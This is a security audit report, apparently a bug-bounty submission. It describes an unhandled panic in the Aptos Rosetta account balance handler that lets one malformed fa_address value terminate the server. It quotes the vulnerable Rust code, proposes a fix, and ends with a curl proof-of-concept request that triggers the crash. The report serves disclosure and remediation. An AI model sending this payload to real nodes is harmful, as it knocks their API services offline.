# Audit Report

## Title
Unhandled Panic in Account Balance Handler Causes Rosetta Server Crash

## Summary
The `handle_request()` wrapper in the Aptos Rosetta service does not properly catch panics from network handlers. A malicious user can trigger a panic by sending malformed fungible asset addresses in the `/account/balance` endpoint, causing the entire Rosetta server process to exit due to the global panic handler.

## Finding Description

The `handle_request()` function wraps all Rosetta API handlers and is designed to catch errors from handlers. However, it only catches `Result<Resp, ApiError>` errors and converts them to HTTP responses. Panics are not caught. [1](#0-0) 

The critical vulnerability exists in the account balance handler where user-provided fungible asset addresses are parsed without validation: [2](#0-1) 

The attack path works as follows:

1. An attacker sends a POST request to `/account/balance` with a JSON body containing a `currencies` array
2. The `currencies` field is part of `AccountBalanceRequest` and is directly deserialized from user input: [3](#0-2) 

3. Each currency can contain a `CurrencyMetadata` with an `fa_address` string field: [4](#0-3) 

4. This user-controlled `fa_address` string is passed through the handler chain without validation
5. In `get_base_balances()`, the code calls `AccountAddress::from_str(fa_address).unwrap()` which panics if the address string is malformed
6. The panic is **not** caught by `handle_request()` because panics bypass Result-based error handling
7. The global panic handler catches the panic and exits the entire process: [5](#0-4) 

Specifically, line 57 calls `process::exit(12)` for any panic not originating from the bytecode verifier or deserializer, immediately terminating the Rosetta server.

## Impact Explanation

This is a **High Severity** vulnerability according to Aptos bug bounty criteria because it causes **API crashes**, which is explicitly listed as a High Severity impact category (up to $50,000).

The vulnerability results in:
- **Total loss of Rosetta API availability** - The entire server process terminates
- **Denial of Service** - Any node operator running the Rosetta API can be taken offline by a single malicious request
- **No authentication required** - The `/account/balance` endpoint is publicly accessible
- **Immediate impact** - The crash occurs instantly upon processing the malformed request

## Likelihood Explanation

This vulnerability has **High likelihood** of exploitation:

- **Trivial to exploit** - Requires only a single HTTP POST request with a malformed JSON body
- **No authentication** - The Rosetta API endpoints are publicly accessible
- **No special permissions** - Any network client can send the malicious request
- **Deterministic** - The crash occurs 100% of the time with malformed input
- **Low attacker cost** - Single HTTP request, no resources needed

The attack complexity is minimal - an attacker simply needs to craft a JSON payload like:
```json
{
  "network_identifier": { "blockchain": "aptos", "network": "mainnet" },
  "account_identifier": { "address": "0x1" },
  "currencies": [{
    "symbol": "FAKE",
    "decimals": 6,
    "metadata": {
      "fa_address": "invalid_address_format"
    }
  }]
}
```

## Recommendation

Replace all `.unwrap()` calls on user-controlled input with proper error handling. Specifically, change the code to return an `ApiError` instead of panicking:

```rust
// In account.rs, line 335, replace:
bcs::to_bytes(&AccountAddress::from_str(fa_address).unwrap()).unwrap()

// With:
bcs::to_bytes(
    &AccountAddress::from_str(fa_address)
        .map_err(|_| ApiError::InvalidInput(Some(format!("Invalid fungible asset address: {}", fa_address))))?
)?
```

Additionally, consider adding input validation for `fa_address` when deserializing the `AccountBalanceRequest` or at the entry point of `get_base_balances()` to fail fast with a proper error response.

More broadly, audit all uses of `.unwrap()` and `.expect()` in request handlers to ensure they cannot panic on user-controlled input.

## Proof of Concept

```bash
#!/bin/bash
# PoC to crash the Rosetta server
# Requires a running Aptos Rosetta server

curl -X POST http://localhost:8080/account/balance \
  -H "Content-Type: application/json" \
  -d '{
    "network_identifier": {
      "blockchain": "aptos",
      "network": "mainnet"
    },
    "account_identifier": {
      "address": "0x1"
    },
    "currencies": [{
      "symbol": "MALICIOUS",
      "decimals": 6,
      "metadata": {
        "fa_address": "this_is_not_a_valid_address_format"
      }
    }]
  }'

# Expected result: Server process exits with code 12
# Expected log: Panic message showing AccountAddress::from_str failure
```

The server will crash immediately upon processing this request, demonstrating the vulnerability. The server logs will show the panic backtrace before the process terminates.

### Citations

**File:** crates/aptos-rosetta/src/common.rs (L62-98)
```rust
pub fn handle_request<'a, F, R, Req, Resp>(
    handler: F,
) -> impl Fn(
    Req,
    RosettaContext,
) -> BoxFuture<'static, Result<warp::reply::WithStatus<warp::reply::Json>, Infallible>>
       + Clone
       + use<F, R, Req, Resp>
where
    F: FnOnce(Req, RosettaContext) -> R + Clone + Copy + Send + 'static,
    R: Future<Output = Result<Resp, ApiError>> + Send,
    Req: Deserialize<'a> + Send + 'static,
    Resp: std::fmt::Debug + Serialize,
{
    move |request, options| {
        let fut = async move {
            match handler(request, options).await {
                Ok(response) => {
                    debug!("Response: {:?}", serde_json::to_string_pretty(&response));
                    Ok(warp::reply::with_status(
                        warp::reply::json(&response),
                        warp::http::StatusCode::OK,
                    ))
                },
                Err(api_error) => {
                    debug!("Error: {:?}", api_error);
                    let status = api_error.status_code();
                    Ok(warp::reply::with_status(
                        warp::reply::json(&api_error.into_error()),
                        status,
                    ))
                },
            }
        };
        Box::pin(fut)
    }
}
```

**File:** crates/aptos-rosetta/src/account.rs (L333-336)
```rust
                    vec![
                        bcs::to_bytes(&owner_address).unwrap(),
                        bcs::to_bytes(&AccountAddress::from_str(fa_address).unwrap()).unwrap(),
                    ],
```

**File:** crates/aptos-rosetta/src/types/requests.rs (L27-38)
```rust
pub struct AccountBalanceRequest {
    /// Network identifier describing the blockchain and the chain id
    pub network_identifier: NetworkIdentifier,
    /// Account identifier describing the account address
    pub account_identifier: AccountIdentifier,
    /// For historical balance lookups by either hash or version
    #[serde(skip_serializing_if = "Option::is_none")]
    pub block_identifier: Option<PartialBlockIdentifier>,
    /// For filtering which currencies to show
    #[serde(skip_serializing_if = "Option::is_none")]
    pub currencies: Option<Vec<Currency>>,
}
```

**File:** crates/aptos-rosetta/src/types/objects.rs (L177-185)
```rust
#[derive(Clone, Debug, Deserialize, Eq, Hash, PartialEq, Serialize)]
pub struct CurrencyMetadata {
    /// Move coin type e.g. 0x1::aptos_coin::AptosCoin
    #[serde(skip_serializing_if = "Option::is_none")]
    pub move_type: Option<String>,
    /// Fungible Asset Address e.g. 0xA
    #[serde(skip_serializing_if = "Option::is_none")]
    pub fa_address: Option<String>,
}
```

**File:** crates/crash-handler/src/lib.rs (L26-57)
```rust
pub fn setup_panic_handler() {
    panic::set_hook(Box::new(move |pi: &PanicHookInfo<'_>| {
        handle_panic(pi);
    }));
}

// Formats and logs panic information
fn handle_panic(panic_info: &PanicHookInfo<'_>) {
    // The Display formatter for a PanicHookInfo contains the message, payload and location.
    let details = format!("{}", panic_info);
    let backtrace = format!("{:#?}", Backtrace::new());

    let info = CrashInfo { details, backtrace };
    let crash_info = toml::to_string_pretty(&info).unwrap();
    error!("{}", crash_info);
    // TODO / HACK ALARM: Write crash info synchronously via eprintln! to ensure it is written before the process exits which error! doesn't guarantee.
    // This is a workaround until https://github.com/aptos-labs/aptos-core/issues/2038 is resolved.
    eprintln!("{}", crash_info);

    // Wait till the logs have been flushed
    aptos_logger::flush();

    // Do not kill the process if the panics happened at move-bytecode-verifier.
    // This is safe because the `state::get_state()` uses a thread_local for storing states. Thus the state can only be mutated to VERIFIER by the thread that's running the bytecode verifier.
    //
    // TODO: once `can_unwind` is stable, we should assert it. See https://github.com/rust-lang/rust/issues/92988.
    if state::get_state() == VMState::VERIFIER || state::get_state() == VMState::DESERIALIZER {
        return;
    }

    // Kill the process
    process::exit(12);
```
